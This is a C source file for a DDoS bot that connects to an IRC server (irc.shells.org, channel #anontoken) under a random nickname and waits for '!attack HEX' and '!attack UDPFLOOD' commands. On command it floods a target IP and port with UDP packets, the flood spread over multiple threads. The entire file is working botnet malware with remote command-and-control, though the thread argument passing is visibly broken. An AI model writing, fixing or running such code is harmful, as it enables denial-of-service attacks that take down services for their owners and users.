#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <time.h>
#include <stdarg.h>
#include <pthread.h>

#define SERVER "irc.shells.org"
#define PORT 7000
#define CHANNEL "#anontoken"
#define USERNAME "YourBotUsername"
#define REALNAME "YourBotRealname"
#define MAX_IP_LEN 16
#define NUM_THREADS 10

void send_data(int sockfd, const char *format, ...) {
    char buffer[512];
    va_list args;
    va_start(args, format);
    vsnprintf(buffer, sizeof(buffer), format, args);
    va_end(args);
    write(sockfd, buffer, strlen(buffer));
    // printf("SENT: %s", buffer);  // Commented out to avoid printing to terminal
}

// Function to generate a random nickname
void generate_random_nick(char *nick, size_t length) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (size_t i = 0; i < length - 1; i++) {
        int key = rand() % (sizeof(charset) - 1);
        nick[i] = charset[key];
    }
    nick[length - 1] = '\0';
}

// UDP Flooder thread function
void *udp_flood_thread(void *arg) {
    struct sockaddr_in addr;
    int sockfd;
    char payload[] = "A";  // Simple payload for UDP flood
    int timeout = ((int*)arg)[0];
    const char *host = ((char**)arg)[1];
    int port = ((int*)arg)[2];

    // Create socket
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket error");
        return NULL;
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    if (inet_pton(AF_INET, host, &addr.sin_addr) <= 0) {
        perror("inet_pton error");
        close(sockfd);
        return NULL;
    }

    printf("Starting UDP flood to %s:%d for %d seconds...\n", host, port, timeout);  // Debugging output

    time_t end_time = time(NULL) + timeout;
    while (time(NULL) < end_time) {
        if (sendto(sockfd, payload, sizeof(payload) - 1, 0, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            perror("sendto error");
        }
    }

    close(sockfd);
    return NULL;
}

// Manager to handle multiple UDP flood threads
void udp_flood_manager(const char *host, int port, int timeout, int max_threads) {
    pthread_t threads[max_threads];
    int thread_args[max_threads][3];
    char *host_str = (char *)host;
    int i;

    for (i = 0; i < max_threads; i++) {
        thread_args[i][0] = timeout;
        thread_args[i][1] = (int)host_str; // Cast to int for simplicity
        thread_args[i][2] = port;
        if (pthread_create(&threads[i], NULL, udp_flood_thread, (void *)thread_args[i]) != 0) {
            perror("pthread_create error");
        }
    }

    for (i = 0; i < max_threads; i++) {
        pthread_join(threads[i], NULL);
    }
}

// Attack HEX function
void attack_hex(const char *host, int port, int duration) {
    int sockfd;
    struct sockaddr_in addr;
    char payload[] = "\x55\x55\x55\x55\x00\x00\x00\x01";

    // Create socket
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket error");
        return;
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    if (inet_pton(AF_INET, host, &addr.sin_addr) <= 0) {
        perror("inet_pton error");
        close(sockfd);
        return;
    }

    printf("Starting HEX attack to %s:%d for %d seconds...\n", host, port, duration);  // Debugging output

    time_t end_time = time(NULL) + duration;
    while (time(NULL) < end_time) {
        if (sendto(sockfd, payload, sizeof(payload) - 1, 0, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            perror("sendto error");
        }
    }

    close(sockfd);
}

int main() {
    int sockfd;
    struct sockaddr_in server_addr;
    struct hostent *server;
    char nickname[10];
    char recv_buffer[512];
    char ip[MAX_IP_LEN];
    int port;
    int duration;

    // Seed the random number generator
    srand(time(NULL));

    // Generate a random nickname
    generate_random_nick(nickname, sizeof(nickname));

    // Create a socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Socket error");
        exit(1);
    }

    // Get server by name
    server = gethostbyname(SERVER);
    if (server == NULL) {
        fprintf(stderr, "Error: No such host\n");
        exit(1);
    }

    // Set up server address struct
    bzero((char *)&server_addr, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    bcopy((char *)server->h_addr, (char *)&server_addr.sin_addr.s_addr, server->h_length);
    server_addr.sin_port = htons(PORT);

    // Connect to the server
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection error");
        exit(1);
    }

    // Register the bot on the IRC server with a random nickname
    send_data(sockfd, "NICK %s\r\n", nickname);
    send_data(sockfd, "USER %s 0 * :%s\r\n", USERNAME, REALNAME);

    // Join the channel
    send_data(sockfd, "JOIN %s\r\n", CHANNEL);

    // Main loop to receive data and respond to server pings
    while (1) {
        bzero(recv_buffer, sizeof(recv_buffer));
        if (read(sockfd, recv_buffer, sizeof(recv_buffer) - 1) <= 0) {
            perror("read error");
            break;
        }

        // Respond to PING messages
        if (strncmp(recv_buffer, "PING", 4) == 0) {
            send_data(sockfd, "PONG %s\r\n", recv_buffer + 5);
        }

        // Check for attack commands
        if (strstr(recv_buffer, "!attack HEX") != NULL) {
            // Extract the command parameters
            if (sscanf(recv_buffer, "!attack HEX %15s %d %d", ip, &port, &duration) == 3) {
                // Call the HEX attack function
                attack_hex(ip, port, duration);
            } else {
                // Send usage instructions to the channel if command parameters are invalid
                send_data(sockfd, "PRIVMSG %s :Usage: !attack HEX <ip> <port> <duration>\r\n", CHANNEL);
            }
        } else if (strstr(recv_buffer, "!attack UDPFLOOD") != NULL) {
            // Extract the command parameters
            if (sscanf(recv_buffer, "!attack UDPFLOOD %15s %d %d", ip, &port, &duration) == 3) {
                // Call the UDP flood manager for UDPFLOOD attacks
                udp_flood_manager(ip, port, duration, NUM_THREADS);
            } else {
                // Send usage instructions to the channel if command parameters are invalid
                send_data(sockfd, "PRIVMSG %s :Usage: !attack UDPFLOOD <ip> <port> <duration>\r\n", CHANNEL);
            }
        }

        // Join the #anontoken channel after registration (look for a numeric 001 code)
        if (strstr(recv_buffer, " 001 ") != NULL) {
            send_data(sockfd, "JOIN %s\r\n", CHANNEL);
        }
    }

    // Close the socket
    close(sockfd);

    return 0;
}
